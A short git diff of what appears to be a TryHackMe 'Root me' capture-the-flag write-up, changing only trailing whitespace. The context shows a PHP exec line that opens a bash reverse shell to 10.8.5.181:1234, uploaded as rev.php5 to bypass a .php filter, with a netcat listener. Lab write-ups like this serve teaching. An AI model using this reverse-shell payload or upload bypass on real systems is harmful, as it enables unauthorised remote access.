@@ -81,7 +81,7 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.5.181/1234 0>&1'");
 
 The file name was rev.php5, as php did not work. Before ulploading it, i will prepare the netcat listener.
 
-If the uploading process was successfull, will appear this panel alongside this link that points to the uploads page.
+If the uploading process was successfull, will appear this panel alongside this link that points to the uploads page.  
 
 ![alt text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Root%20me/images/89-4.png)
 
